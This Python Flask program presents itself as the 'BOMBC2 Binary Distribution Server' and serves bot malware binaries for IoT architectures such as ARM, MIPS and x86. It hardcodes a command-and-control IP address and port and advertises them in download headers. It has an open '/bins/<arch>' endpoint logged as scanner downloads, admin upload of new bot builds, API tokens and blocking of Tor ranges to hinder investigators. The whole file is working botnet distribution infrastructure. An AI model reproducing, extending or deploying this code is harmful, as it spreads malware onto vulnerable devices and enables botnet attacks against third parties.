#!/usr/bin/env python3
import os
import hashlib
import secrets
import json
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import logging
import threading
import ipaddress
from ipaddress import ip_address, ip_network
from flask import Flask, request, Response, jsonify, abort, make_response
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_cors import CORS
from werkzeug.middleware.proxy_fix import ProxyFix
import psutil

class Config:
    SECRET_KEY = secrets.token_hex(32)
    TOKEN_EXPIRY = 3600
    RATE_LIMIT_PER_IP = "200 per hour"
    RATE_LIMIT_PER_TOKEN = "2000 per hour"
    MAX_CONTENT_LENGTH = 32 * 1024 * 1024
    BOT_FILES_DIR = "bots"
    ALLOWED_ARCHS = {
        'arm': 'arm/arm',
        'arm5': 'arm5/arm5',
        'arm6': 'arm6/arm6',
        'arm7': 'arm7/arm7',
        'mips': 'mips/mips',
        'mipsel': 'mipsel/mipsel',
        'x86': 'x86/x86',
        'x86_64': 'x86_64/x86_64',
        'aarch64': 'aarch64/aarch64'
    }
    CNC_IP = "172.96.140.62"
    CNC_PORT = 14037
    CNC_REPORT_PORT = 14037
    API_TOKENS_FILE = "api_tokens.json"
    ADMIN_USERNAME = "admin"
    ADMIN_PASSWORD_HASH = ""
    LOG_FILE = "distribution_server.log"
    ACCESS_LOG = "access.log"
    BOT_MIN_SIZE = 1000
    BOT_MAX_SIZE = 10 * 1024 * 1024
    BLOCK_TOR = True
    TOR_EXIT_NODES_FILE = "tor_exit_nodes.txt"
    TOR_NETWORKS = [
        "192.42.116.0/24",
        "185.220.101.0/24",
        "185.220.102.0/24",
        "185.220.103.0/24",
        "178.20.55.0/24",
        "178.20.55.16/28",
        "193.23.244.0/24",
        "199.249.230.0/24",
        "204.8.156.0/24",
        "45.128.133.0/24",
        "45.134.225.0/24",
        "45.154.255.0/24",
        "45.95.235.0/24",
        "51.222.86.0/24",
        "62.102.148.0/24",
        "71.19.144.0/24",
        "71.19.157.0/24",
        "76.146.212.0/24",
        "81.17.16.0/24",
        "81.17.18.0/24",
        "81.17.19.0/24",
        "81.17.20.0/24",
        "81.17.21.0/24",
        "81.17.22.0/24",
        "81.17.23.0/24",
        "81.17.24.0/24"
    ]

def setup_logging():
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.FileHandler(Config.LOG_FILE),
            logging.StreamHandler()
        ]
    )
    access_logger = logging.getLogger('access')
    access_handler = logging.FileHandler(Config.ACCESS_LOG)
    access_handler.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
    access_logger.addHandler(access_handler)
    access_logger.setLevel(logging.INFO)
    access_logger.propagate = False
    return logging.getLogger(__name__), access_logger

logger, access_logger = setup_logging()

class IPManager:
    def __init__(self):
        self.blacklisted_ips = {}
        self.failed_attempts = {}
        self.download_counts = {}
        self.tor_exit_nodes = set()
        self.tor_networks = []
        self.lock = threading.Lock()
        self.load_tor_networks()
        
    def load_tor_networks(self):
        try:
            self.tor_networks = [ip_network(net) for net in Config.TOR_NETWORKS]
            
            if os.path.exists(Config.TOR_EXIT_NODES_FILE):
                with open(Config.TOR_EXIT_NODES_FILE, 'r') as f:
                    for line in f:
                        ip = line.strip()
                        if ip and self.is_valid_ip(ip):
                            self.tor_exit_nodes.add(ip)
        except Exception as e:
            logger.error(f"Erro carregando redes TOR: {e}")
            
    def is_tor_node(self, ip_str):
        if not Config.BLOCK_TOR:
            return False
            
        try:
            ip = ip_address(ip_str)
            
            if ip_str in self.tor_exit_nodes:
                return True
                
            for network in self.tor_networks:
                if ip in network:
                    return True
                    
            return False
        except ValueError:
            return False
            
    def is_blacklisted(self, ip):
        with self.lock:
            if Config.BLOCK_TOR and self.is_tor_node(ip):
                return True
                
            if ip in self.blacklisted_ips:
                if time.time() - self.blacklisted_ips[ip] < 86400:
                    return True
                else:
                    del self.blacklisted_ips[ip]
            return False
            
    def record_failed_attempt(self, ip):
        with self.lock:
            if ip not in self.failed_attempts:
                self.failed_attempts[ip] = []
            now = time.time()
            self.failed_attempts[ip].append(now)
            self.failed_attempts[ip] = [t for t in self.failed_attempts[ip] if now - t < 3600]
            if len(self.failed_attempts[ip]) >= 10:
                self.blacklisted_ips[ip] = now
                logger.warning(f"IP {ip} adicionado à blacklist")
                
    def record_download(self, ip):
        with self.lock:
            if ip not in self.download_counts:
                self.download_counts[ip] = 0
            self.download_counts[ip] += 1
            
    def get_download_count(self, ip):
        with self.lock:
            return self.download_counts.get(ip, 0)
            
    def is_valid_ip(self, ip_str):
        try:
            ip = ip_address(ip_str)
            if ip.is_private or ip.is_multicast or ip.is_loopback or ip.is_reserved:
                return False
            return True
        except ValueError:
            return False
            
    def get_client_ip(self):
        headers_to_check = [
            'X-Real-IP',
            'X-Forwarded-For',
            'CF-Connecting-IP',
            'True-Client-IP',
        ]
        for header in headers_to_check:
            ip = request.headers.get(header)
            if ip and self.is_valid_ip(ip.split(',')[0].strip()):
                return ip.split(',')[0].strip()
        return request.remote_addr or '0.0.0.0'

class TokenManager:
    def __init__(self, tokens_file):
        self.tokens_file = tokens_file
        self.tokens = {}
        self.lock = threading.Lock()
        self.load_tokens()
        
    def load_tokens(self):
        try:
            if os.path.exists(self.tokens_file):
                with open(self.tokens_file, 'r') as f:
                    data = json.load(f)
                    self.tokens = data.get('tokens', {})
            else:
                admin_token = secrets.token_hex(32)
                self.tokens[admin_token] = {
                    'name': 'admin',
                    'created': datetime.now().isoformat(),
                    'last_used': None,
                    'rate_limit': 5000,
                    'enabled': True,
                    'downloads': 0
                }
                self.save_tokens()
                logger.info(f"Token admin criado")
        except Exception as e:
            logger.error(f"Erro carregando tokens: {e}")
            self.tokens = {}
            
    def save_tokens(self):
        try:
            with open(self.tokens_file, 'w') as f:
                json.dump({'tokens': self.tokens}, f, indent=2, sort_keys=True)
        except Exception as e:
            logger.error(f"Erro salvando tokens: {e}")
            
    def validate_token(self, token):
        with self.lock:
            if token not in self.tokens:
                return False, None
            token_data = self.tokens[token]
            if not token_data.get('enabled', True):
                return False, None
            token_data['last_used'] = datetime.now().isoformat()
            token_data['downloads'] = token_data.get('downloads', 0) + 1
            self.save_tokens()
            return True, token_data
            
    def create_token(self, name, rate_limit = 200):
        with self.lock:
            token = secrets.token_hex(32)
            self.tokens[token] = {
                'name': name,
                'created': datetime.now().isoformat(),
                'last_used': None,
                'rate_limit': rate_limit,
                'enabled': True,
                'downloads': 0
            }
            self.save_tokens()
            logger.info(f"Token criado para {name}")
            return token
            
    def revoke_token(self, token):
        with self.lock:
            if token in self.tokens:
                del self.tokens[token]
                self.save_tokens()
                return True
            return False
            
    def get_token_stats(self):
        with self.lock:
            stats = {
                'total_tokens': len(self.tokens),
                'active_tokens': sum(1 for t in self.tokens.values() if t.get('enabled', True)),
                'total_downloads': sum(t.get('downloads', 0) for t in self.tokens.values()),
                'tokens': []
            }
            for token, data in self.tokens.items():
                stats['tokens'].append({
                    'name': data.get('name', 'unknown'),
                    'created': data.get('created'),
                    'last_used': data.get('last_used'),
                    'downloads': data.get('downloads', 0),
                    'enabled': data.get('enabled', True)
                })
            return stats

class FileManager:
    def __init__(self, base_dir):
        self.base_dir = base_dir
        self.file_hashes = {}
        self.file_sizes = {}
        self.file_mtimes = {}
        self.lock = threading.Lock()
        self.ensure_directories()
        self.scan_files()
    
    def ensure_directories(self):
        for arch, filepath in Config.ALLOWED_ARCHS.items():
            dir_path = os.path.dirname(os.path.join(self.base_dir, filepath))
            os.makedirs(dir_path, exist_ok=True)
            
    def scan_files(self):
        with self.lock:
            self.file_hashes.clear()
            self.file_sizes.clear()
            self.file_mtimes.clear()
            
            for arch, filepath in Config.ALLOWED_ARCHS.items():
                full_path = os.path.join(self.base_dir, filepath)
                if os.path.exists(full_path):
                    try:
                        with open(full_path, 'rb') as f:
                            content = f.read()
                            if content != b'BOMBC2_BOT_PLACEHOLDER':
                                file_hash = hashlib.sha256(content).hexdigest()
                                self.file_hashes[arch] = file_hash
                                self.file_sizes[arch] = len(content)
                                self.file_mtimes[arch] = os.path.getmtime(full_path)
                            else:
                                logger.warning(f"Placeholder encontrado para {arch}")
                    except Exception as e:
                        logger.error(f"Erro lendo arquivo {filepath}: {e}")
                        
    def get_file(self, arch):
        if arch not in Config.ALLOWED_ARCHS:
            return None
            
        filepath = Config.ALLOWED_ARCHS[arch]
        full_path = os.path.join(self.base_dir, filepath)
        
        if not os.path.exists(full_path):
            logger.warning(f"Arquivo não encontrado: {full_path}")
            return None
                
        try:
            with open(full_path, 'rb') as f:
                content = f.read()
                if content == b'BOMBC2_BOT_PLACEHOLDER':
                    logger.error(f"Placeholder detectado para {arch}")
                    return None
                filename = f"bot_{arch}"
                return filename, content
        except Exception as e:
            logger.error(f"Erro lendo arquivo {full_path}: {e}")
            return None
            
    def update_file(self, arch, content):
        if arch not in Config.ALLOWED_ARCHS:
            return False
            
        if not self._validate_binary_content(content):
            return False
            
        filepath = Config.ALLOWED_ARCHS[arch]
        full_path = os.path.join(self.base_dir, filepath)
        
        try:
            dir_path = os.path.dirname(full_path)
            os.makedirs(dir_path, exist_ok=True)
            
            with open(full_path, 'wb') as f:
                f.write(content)
                
            file_hash = hashlib.sha256(content).hexdigest()
            
            with self.lock:
                self.file_hashes[arch] = file_hash
                self.file_sizes[arch] = len(content)
                self.file_mtimes[arch] = time.time()
                
            logger.info(f"Arquivo {filepath} atualizado")
            return True
            
        except Exception as e:
            logger.error(f"Erro atualizando arquivo {filepath}: {e}")
            return False
            
    def _validate_binary_content(self, content):
        if content == b'BOMBC2_BOT_PLACEHOLDER':
            logger.error(f"Conteúdo é placeholder")
            return False
            
        if len(content) < Config.BOT_MIN_SIZE:
            logger.error(f"Conteúdo muito pequeno")
            return False
            
        if len(content) > Config.BOT_MAX_SIZE:
            logger.error(f"Conteúdo muito grande")
            return False
            
        return True
        
    def get_file_info(self, arch):
        if arch not in Config.ALLOWED_ARCHS:
            return None
            
        with self.lock:
            if arch in self.file_hashes:
                return {
                    'arch': arch,
                    'filename': Config.ALLOWED_ARCHS[arch],
                    'hash': self.file_hashes[arch],
                    'size': self.file_sizes[arch],
                    'mtime': datetime.fromtimestamp(self.file_mtimes[arch]).isoformat()
                }
        return None
        
    def get_all_files_info(self):
        files_info = {}
        for arch in Config.ALLOWED_ARCHS:
            info = self.get_file_info(arch)
            if info:
                files_info[arch] = info
        return files_info

app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY
app.config['MAX_CONTENT_LENGTH'] = Config.MAX_CONTENT_LENGTH
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1)
CORS(app, resources={
    r"/api/*": {"origins": ["*"]},
    r"/status": {"origins": ["*"]},
    r"/bins/*": {"origins": ["*"]},
    r"/download/*": {"origins": ["*"]}
})
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=[Config.RATE_LIMIT_PER_IP],
    strategy="fixed-window"
)
ip_manager = IPManager()
token_manager = TokenManager(Config.API_TOKENS_FILE)
file_manager = FileManager(Config.BOT_FILES_DIR)
download_counter = 0
download_counter_lock = threading.Lock()

@app.before_request
def before_request():
    client_ip = ip_manager.get_client_ip()
    request.client_ip = client_ip
    
    if ip_manager.is_blacklisted(client_ip):
        access_logger.info(f"BLOCKED {client_ip} {request.method} {request.path}")
        abort(403, description="IP blocked")
        
    if Config.BLOCK_TOR and ip_manager.is_tor_node(client_ip):
        access_logger.info(f"TOR_BLOCKED {client_ip} {request.method} {request.path}")
        abort(403, description="TOR network blocked")
        
    if request.path.startswith('/bins/') or request.path.startswith('/download/'):
        access_logger.info(
            f"DOWNLOAD {client_ip} {request.method} {request.path}"
        )
    else:
        access_logger.info(
            f"{client_ip} {request.method} {request.path}"
        )

@app.after_request
def after_request(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    if request.path.startswith('/bins/') or request.path.startswith('/download/'):
        response.headers['Cache-Control'] = 'public, max-age=300'
        response.headers['X-BOT-Version'] = '3.0'
        response.headers['X-CNC-IP'] = Config.CNC_IP
        response.headers['X-CNC-Port'] = str(Config.CNC_PORT)
    else:
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
        
    return response

@app.route('/')
def index():
    return jsonify({
        'service': 'BOMBC2 Binary Distribution Server',
        'version': '3.0',
        'cnc_server': f'{Config.CNC_IP}:{Config.CNC_PORT}',
        'endpoints': {
            'status': '/status',
            'download': '/bins/<arch>',
            'api_download': '/api/download/<arch>',
            'list_archs': '/archs',
            'stats': '/api/stats'
        },
        'timestamp': datetime.now().isoformat()
    })

@app.route('/status')
@limiter.limit("30 per minute")
def status():
    with download_counter_lock:
        global download_counter
        total_downloads = download_counter
        
    arch_info = {}
    for arch in Config.ALLOWED_ARCHS:
        info = file_manager.get_file_info(arch)
        if info:
            arch_info[arch] = {
                'size': info['size'],
                'hash': info['hash'][:16]
            }
    
    return jsonify({
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'cnc_server': f"{Config.CNC_IP}:{Config.CNC_PORT}",
        'files_available': list(Config.ALLOWED_ARCHS.keys()),
        'arch_info': arch_info,
        'total_downloads': total_downloads,
        'uptime': get_uptime(),
        'memory_usage': get_memory_usage()
    })

@app.route('/archs')
@limiter.limit("20 per minute")
def list_archs():
    archs_info = []
    for arch, filename in Config.ALLOWED_ARCHS.items():
        info = file_manager.get_file_info(arch)
        if info:
            archs_info.append({
                'arch': arch,
                'filename': filename,
                'size': info['size'],
                'hash': info['hash'][:16],
                'updated': info['mtime']
            })
    
    return jsonify({
        'architectures': Config.ALLOWED_ARCHS,
        'archs_info': archs_info,
        'total': len(Config.ALLOWED_ARCHS)
    })

def require_token(f):
    def decorated(*args, **kwargs):
        token = request.headers.get('X-API-Token')
        if not token:
            abort(401, description="Token required")
        valid, token_data = token_manager.validate_token(token)
        if not valid:
            abort(401, description="Invalid token")
        request.token_data = token_data
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

def require_admin(f):
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != Config.ADMIN_USERNAME:
            return Response(
                'Authentication required',
                401,
                {'WWW-Authenticate': 'Basic realm="Login Required"'}
            )
        if not verify_password(auth.password):
            abort(401, description="Invalid credentials")
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

def verify_password(password):
    if not Config.ADMIN_PASSWORD_HASH:
        import bcrypt
        Config.ADMIN_PASSWORD_HASH = bcrypt.hashpw(
            password.encode(), 
            bcrypt.gensalt()
        ).decode()
        logger.info("Admin password set on first login")
        return True
    try:
        import bcrypt
        return bcrypt.checkpw(
            password.encode(),
            Config.ADMIN_PASSWORD_HASH.encode()
        )
    except:
        return False

@app.route('/api/download/<arch>', methods=['GET'])
@require_token
@limiter.limit(lambda: f"{request.token_data.get('rate_limit', 200)} per hour")
def api_download(arch):
    if arch not in Config.ALLOWED_ARCHS:
        abort(404, description="Architecture not supported")
        
    file_data = file_manager.get_file(arch)
    if not file_data:
        abort(404, description="File not found")
        
    filename, content = file_data
    
    with download_counter_lock:
        global download_counter
        download_counter += 1
        
    ip_manager.record_download(request.client_ip)
    
    logger.info(
        f"API Download: {arch} by {request.token_data.get('name', 'unknown')}"
    )
    
    response = make_response(content)
    response.headers['Content-Type'] = 'application/octet-stream'
    response.headers['Content-Disposition'] = f'attachment; filename="{filename}"'
    response.headers['X-File-Hash'] = file_manager.file_hashes.get(arch, 'unknown')
    response.headers['X-File-Size'] = str(len(content))
    response.headers['X-Architecture'] = arch
    
    return response

@app.route('/api/upload', methods=['POST'])
@require_admin
def api_upload():
    try:
        if 'arch' not in request.form:
            abort(400, description="Architecture required")
        arch = request.form['arch']
        if arch not in Config.ALLOWED_ARCHS:
            abort(400, description="Invalid architecture")
        if 'file' not in request.files:
            abort(400, description="File required")
        file = request.files['file']
        if not file.filename:
            abort(400, description="No file selected")
            
        content = file.read()
        if len(content) > Config.BOT_MAX_SIZE:
            abort(413, description="File too large")
            
        if file_manager.update_file(arch, content):
            return jsonify({
                'status': 'success',
                'message': f'File for {arch} updated',
                'hash': file_manager.file_hashes.get(arch, 'unknown'),
                'size': len(content)
            })
        else:
            abort(400, description="Invalid file content")
    except Exception as e:
        logger.error(f"Upload error: {e}")
        abort(500, description="Internal server error")

@app.route('/api/stats', methods=['GET'])
@require_token
def api_stats():
    with download_counter_lock:
        global download_counter
        total_downloads = download_counter
        
    token_stats = token_manager.get_token_stats()
    
    stats = {
        'timestamp': datetime.now().isoformat(),
        'files': file_manager.get_all_files_info(),
        'total_downloads': total_downloads,
        'token_stats': token_stats,
        'system_stats': {
            'memory_usage': get_memory_usage(),
            'uptime': get_uptime(),
            'connections': threading.active_count() - 1
        }
    }
            
    return jsonify(stats)

@app.route('/api/token', methods=['POST'])
@require_admin
def api_create_token():
    try:
        data = request.get_json() or {}
        name = data.get('name', 'unnamed')
        rate_limit = min(max(int(data.get('rate_limit', 200)), 10), 10000)
        token = token_manager.create_token(name, rate_limit)
        return jsonify({
            'status': 'success',
            'token': token,
            'name': name,
            'rate_limit': rate_limit
        })
    except Exception as e:
        logger.error(f"Token creation error: {e}")
        abort(400, description="Invalid request")

@app.route('/api/token/<token>', methods=['DELETE'])
@require_admin
def api_revoke_token(token):
    if token_manager.revoke_token(token):
        return jsonify({'status': 'success', 'message': 'Token revoked'})
    else:
        abort(404, description="Token not found")

@app.route('/bins/<arch>', methods=['GET'])
@limiter.limit("100 per hour")
def bins_download(arch):
    if arch not in Config.ALLOWED_ARCHS:
        abort(404, description="Architecture not supported")
        
    file_data = file_manager.get_file(arch)
    if not file_data:
        abort(404, description="File not found")
        
    filename, content = file_data
    
    with download_counter_lock:
        global download_counter
        download_counter += 1
        
    ip_manager.record_download(request.client_ip)
    
    logger.info(f"Scanner download: {arch}")
    
    response = make_response(content)
    response.headers['Content-Type'] = 'application/octet-stream'
    response.headers['Content-Disposition'] = f'attachment; filename="bot_{arch}"'
    response.headers['X-File-Hash'] = file_manager.file_hashes.get(arch, 'unknown')
    response.headers['X-File-Size'] = str(len(content))
    response.headers['X-Architecture'] = arch
    
    return response

@app.route('/download/<arch>', methods=['GET'])
@limiter.limit("50 per hour")
def legacy_download(arch):
    token = request.args.get('token')
    if not token:
        abort(401, description="Token required")
    valid, token_data = token_manager.validate_token(token)
    if not valid:
        abort(401, description="Invalid token")
    request.token_data = token_data
    return api_download(arch)

def get_uptime():
    if not hasattr(app, 'start_time'):
        app.start_time = time.time()
    uptime = int(time.time() - app.start_time)
    days = uptime // 86400
    hours = (uptime % 86400) // 3600
    minutes = (uptime % 3600) // 60
    seconds = uptime % 60
    return f"{days}d {hours}h {minutes}m {seconds}s"

def get_memory_usage():
    try:
        process = psutil.Process()
        memory_info = process.memory_info()
        return {
            'rss': memory_info.rss,
            'vms': memory_info.vms,
            'percent': process.memory_percent(),
            'cpu_percent': process.cpu_percent(interval=0.1)
        }
    except:
        return {
            'rss': 0,
            'vms': 0,
            'percent': 0.0,
            'cpu_percent': 0.0
        }

@app.errorhandler(400)
def bad_request(error):
    return jsonify({
        'error': 'Bad Request',
        'message': str(error.description)
    }), 400

@app.errorhandler(401)
def unauthorized(error):
    return jsonify({
        'error': 'Unauthorized',
        'message': str(error.description)
    }), 401

@app.errorhandler(403)
def forbidden(error):
    return jsonify({
        'error': 'Forbidden',
        'message': str(error.description)
    }), 403

@app.errorhandler(404)
def not_found(error):
    return jsonify({
        'error': 'Not Found',
        'message': str(error.description)
    }), 404

@app.errorhandler(429)
def ratelimit_error(error):
    return jsonify({
        'error': 'Too Many Requests',
        'message': 'Rate limit exceeded'
    }), 429

@app.errorhandler(500)
def internal_error(error):
    logger.error(f"Internal error: {error}")
    return jsonify({
        'error': 'Internal Server Error',
        'message': 'An unexpected error occurred'
    }), 500

def initialize_server():
    logger.info("BOMBC2 Binary Distribution Server v3.0")
    logger.info(f"CNC Server: {Config.CNC_IP}:{Config.CNC_PORT}")
    
    if not os.path.exists(Config.BOT_FILES_DIR):
        os.makedirs(Config.BOT_FILES_DIR)
        logger.info(f"Diretório criado: {Config.BOT_FILES_DIR}")
    
    file_manager.scan_files()
    
    logger.info("Arquiteturas suportadas:")
    for arch, filename in Config.ALLOWED_ARCHS.items():
        info = file_manager.get_file_info(arch)
        if info and info['size'] > 1000:
            size_mb = info['size'] / 1024 / 1024
            logger.info(f"  {arch}: {filename} ({info['size']:,} bytes)")
        else:
            logger.warning(f"  {arch}: {filename} (AUSENTE ou placeholder)")
    
    if Config.BLOCK_TOR:
        logger.info(f"Bloqueio TOR: ATIVADO ({len(ip_manager.tor_networks)} redes bloqueadas)")
    
    logger.info(f"Servidor pronto na porta 1283")
    logger.info(f"Admin user: {Config.ADMIN_USERNAME}")

if __name__ == '__main__':
    initialize_server()
    app.run(
        host='0.0.0.0',
        port=1283,
        debug=False,
        threaded=True,
        use_reloader=False
    )
